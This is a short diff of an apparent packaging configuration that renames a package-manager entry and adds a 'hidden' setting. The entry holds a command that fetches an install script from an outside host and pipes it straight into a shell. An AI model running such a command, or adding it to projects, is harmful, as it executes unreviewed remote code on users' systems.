@@ -3,9 +3,10 @@
     "artifacts": {
       "auto": true,
       "cargo_dist": true,
+      "hidden": ["shell"],
       "package_managers": {
-        "additional": {
-          "shell": "curl -fsSL https://i.to01.icu/install.sh | sh"
+        "preferred": {
+          "Shell": "curl -fsSL https://i.to01.icu/install.sh | sh"
         }
       }
     }
